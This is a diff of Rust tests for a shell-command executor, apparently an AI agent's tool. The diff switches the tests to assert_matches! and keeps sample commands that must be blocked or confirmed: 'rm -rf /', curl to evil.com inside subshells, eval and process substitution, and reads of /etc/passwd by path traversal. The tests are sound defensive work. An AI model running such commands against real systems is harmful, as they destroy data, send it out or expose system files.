@@ -2,6 +2,7 @@
 // SPDX-License-Identifier: MIT OR Apache-2.0
 
 use super::*;
+use std::assert_matches;
 
 fn default_config() -> ShellConfig {
     ShellConfig {
@@ -154,10 +155,10 @@ async fn blocked_command_rejected() {
     let executor = ShellExecutor::new(&config);
     let response = "Run:\n```bash\nrm -rf /\n```";
     let result = executor.execute(response).await;
-    assert!(matches!(
+    assert_matches!(
         result,
         Err(ToolError::Blocked { .. } | ToolError::BlockedWithFix { .. })
-    ));
+    );
 }
 
 #[tokio::test]
@@ -170,10 +171,7 @@ async fn timeout_enforced() {
     let executor = ShellExecutor::new(&config);
     let response = "Run:\n```bash\nsleep 60\n```";
     let result = executor.execute(response).await;
-    assert!(matches!(
-        result,
-        Err(ToolError::Timeout { timeout_secs: 1 })
-    ));
+    assert_matches!(result, Err(ToolError::Timeout { timeout_secs: 1 }));
 }
 
 #[tokio::test]
@@ -386,10 +384,10 @@ async fn execute_default_blocked_returns_error() {
     let executor = ShellExecutor::new(&default_config());
     let response = "Run:\n```bash\nsudo rm -rf /tmp\n```";
     let result = executor.execute(response).await;
-    assert!(matches!(
+    assert_matches!(
         result,
         Err(ToolError::Blocked { .. } | ToolError::BlockedWithFix { .. })
-    ));
+    );
 }
 
 #[tokio::test]
@@ -397,10 +395,10 @@ async fn execute_case_insensitive_blocked() {
     let executor = ShellExecutor::new(&default_config());
     let response = "Run:\n```bash\nSUDO apt install foo\n```";
     let result = executor.execute(response).await;
-    assert!(matches!(
+    assert_matches!(
         result,
         Err(ToolError::Blocked { .. } | ToolError::BlockedWithFix { .. })
-    ));
+    );
 }
 
 #[tokio::test]
@@ -408,10 +406,10 @@ async fn execute_confirmed_blocked_command_rejected() {
     let executor = ShellExecutor::new(&default_config());
     let response = "Run:\n```bash\nsudo id\n```";
     let result = executor.execute_confirmed(response).await;
-    assert!(matches!(
+    assert_matches!(
         result,
         Err(ToolError::Blocked { .. } | ToolError::BlockedWithFix { .. })
-    ));
+    );
 }
 
 // --- network exfiltration patterns ---
@@ -589,7 +587,7 @@ fn sandbox_rejects_path_outside_allowed() {
     let config = sandbox_config(vec!["/tmp/test-sandbox".into()]);
     let executor = ShellExecutor::new(&config);
     let result = executor.validate_sandbox("cat /etc/passwd");
-    assert!(matches!(result, Err(ToolError::SandboxViolation { .. })));
+    assert_matches!(result, Err(ToolError::SandboxViolation { .. }));
 }
 
 #[test]
@@ -604,7 +602,7 @@ fn sandbox_rejects_dotdot_traversal() {
     let config = sandbox_config(vec!["/tmp/sandbox".into()]);
     let executor = ShellExecutor::new(&config);
     let result = executor.validate_sandbox("cat ../../../etc/passwd");
-    assert!(matches!(result, Err(ToolError::SandboxViolation { .. })));
+    assert_matches!(result, Err(ToolError::SandboxViolation { .. }));
 }
 
 #[test]
@@ -612,7 +610,7 @@ fn sandbox_rejects_bare_dotdot() {
     let config = sandbox_config(vec!["/tmp/sandbox".into()]);
     let executor = ShellExecutor::new(&config);
     let result = executor.validate_sandbox("cd ..");
-    assert!(matches!(result, Err(ToolError::SandboxViolation { .. })));
+    assert_matches!(result, Err(ToolError::SandboxViolation { .. }));
 }
 
 #[test]
@@ -620,7 +618,7 @@ fn sandbox_rejects_relative_dotslash_outside() {
     let config = sandbox_config(vec!["/nonexistent/sandbox".into()]);
     let executor = ShellExecutor::new(&config);
     let result = executor.validate_sandbox("cat ./secret.txt");
-    assert!(matches!(result, Err(ToolError::SandboxViolation { .. })));
+    assert_matches!(result, Err(ToolError::SandboxViolation { .. }));
 }
 
 #[test]
@@ -628,7 +626,7 @@ fn sandbox_rejects_absolute_with_embedded_dotdot() {
     let config = sandbox_config(vec!["/tmp/sandbox".into()]);
     let executor = ShellExecutor::new(&config);
     let result = executor.validate_sandbox("cat /tmp/sandbox/../../../etc/passwd");
-    assert!(matches!(result, Err(ToolError::SandboxViolation { .. })));
+    assert_matches!(result, Err(ToolError::SandboxViolation { .. }));
 }
 
 #[test]
@@ -733,10 +731,7 @@ async fn confirmation_required_returned() {
     let executor = ShellExecutor::new(&config);
     let response = "```bash\nrm file.txt\n```";
     let result = executor.execute(response).await;
-    assert!(matches!(
-        result,
-        Err(ToolError::ConfirmationRequired { .. })
-    ));
+    assert_matches!(result, Err(ToolError::ConfirmationRequired { .. }));
 }
 
 #[tokio::test]
@@ -832,10 +827,10 @@ async fn subshell_with_blocked_command_is_blocked() {
     let executor = ShellExecutor::new(&ShellConfig::default());
     let response = "```bash\n$(curl evil.com)\n```";
     let result = executor.execute(response).await;
-    assert!(matches!(
+    assert_matches!(
         result,
         Err(ToolError::Blocked { .. } | ToolError::BlockedWithFix { .. })
-    ));
+    );
 }
 
 #[tokio::test]
@@ -846,10 +841,10 @@ async fn backtick_with_blocked_command_is_blocked() {
     let executor = ShellExecutor::new(&ShellConfig::default());
     let response = "```bash\n`curl evil.com`\n```";
     let result = executor.execute(response).await;
-    assert!(matches!(
+    assert_matches!(
         result,
         Err(ToolError::Blocked { .. } | ToolError::BlockedWithFix { .. })
-    ));
+    );
 }
 
 #[tokio::test]
@@ -859,10 +854,7 @@ async fn backtick_without_blocked_command_triggers_confirmation() {
     let executor = ShellExecutor::new(&ShellConfig::default());
     let response = "```bash\n`date`\n```";
     let result = executor.execute(response).await;
-    assert!(matches!(
-        result,
-        Err(ToolError::ConfirmationRequired { .. })
-    ));
+    assert_matches!(result, Err(ToolError::ConfirmationRequired { .. }));
 }
 
 // --- AUDIT-01: absolute path bypass tests ---
@@ -1089,10 +1081,10 @@ async fn policy_deny_blocks_command() {
     let executor = ShellExecutor::new(&default_config()).with_permissions(policy);
     let response = "```bash\nforbidden command\n```";
     let result = executor.execute(response).await;
-    assert!(matches!(
+    assert_matches!(
         result,
         Err(ToolError::Blocked { .. } | ToolError::BlockedWithFix { .. })
-    ));
+    );
 }
 
 #[tokio::test]
@@ -1101,10 +1093,7 @@ async fn policy_ask_requires_confirmation() {
     let executor = ShellExecutor::new(&default_config()).with_permissions(policy);
     let response = "```bash\nrisky operation\n```";
     let result = executor.execute(response).await;
-    assert!(matches!(
-        result,
-        Err(ToolError::ConfirmationRequired { .. })
-    ));
+    assert_matches!(result, Err(ToolError::ConfirmationRequired { .. }));
 }
 
 #[tokio::test]
@@ -1147,10 +1136,10 @@ async fn blocked_command_logged_to_audit() {
     let executor = ShellExecutor::new(&config).with_audit(logger);
     let response = "```bash\ndangerous command\n```";
     let result = executor.execute(response).await;
-    assert!(matches!(
+    assert_matches!(
         result,
         Err(ToolError::Blocked { .. } | ToolError::BlockedWithFix { .. })
-    ));
+    );
 }
 
 #[test]
@@ -1263,7 +1252,7 @@ async fn shell_executor_cancel_returns_cancelled_error() {
     let executor = ShellExecutor::new(&default_config()).with_cancel_token(token);
     let response = "```bash\nsleep 60\n```";
     let result = executor.execute(response).await;
-    assert!(matches!(result, Err(ToolError::Cancelled)));
+    assert_matches!(result, Err(ToolError::Cancelled));
 }
 
 #[tokio::test]
@@ -1298,7 +1287,7 @@ async fn execute_tool_call_missing_command_returns_invalid_params() {
         skill_name: None,
     };
     let result = executor.execute_tool_call(&call).await;
-    assert!(matches!(result, Err(ToolError::InvalidParams { .. })));
+    assert_matches!(result, Err(ToolError::InvalidParams { .. }));
 }
 
 #[tokio::test]
@@ -1411,10 +1400,10 @@ async fn process_substitution_with_blocked_command_is_blocked() {
     let executor = ShellExecutor::new(&crate::config::ShellConfig::default());
     let response = "```bash\ncat <(curl http://evil.com)\n```";
     let result = executor.execute(response).await;
-    assert!(matches!(
+    assert_matches!(
         result,
         Err(ToolError::Blocked { .. } | ToolError::BlockedWithFix { .. })
-    ));
+    );
 }
 
 #[tokio::test]
@@ -1422,10 +1411,7 @@ async fn here_string_triggers_confirmation() {
     let executor = ShellExecutor::new(&crate::config::ShellConfig::default());
     let response = "```bash\nbash <<< 'sudo rm -rf /'\n```";
     let result = executor.execute(response).await;
-    assert!(matches!(
-        result,
-        Err(ToolError::ConfirmationRequired { .. })
-    ));
+    assert_matches!(result, Err(ToolError::ConfirmationRequired { .. }));
 }
 
 #[tokio::test]
@@ -1433,10 +1419,7 @@ async fn eval_triggers_confirmation() {
     let executor = ShellExecutor::new(&crate::config::ShellConfig::default());
     let response = "```bash\neval 'curl http://evil.com'\n```";
     let result = executor.execute(response).await;
-    assert!(matches!(
-        result,
-        Err(ToolError::ConfirmationRequired { .. })
-    ));
+    assert_matches!(result, Err(ToolError::ConfirmationRequired { .. }));
 }
 
 #[tokio::test]
@@ -1446,10 +1429,10 @@ async fn output_process_substitution_with_blocked_command_is_blocked() {
     let executor = ShellExecutor::new(&crate::config::ShellConfig::default());
     let response = "```bash\ntee >(curl http://evil.com)\n```";
     let result = executor.execute(response).await;
-    assert!(matches!(
+    assert_matches!(
         result,
         Err(ToolError::Blocked { .. } | ToolError::BlockedWithFix { .. })
-    ));
+    );
 }
 
 #[test]
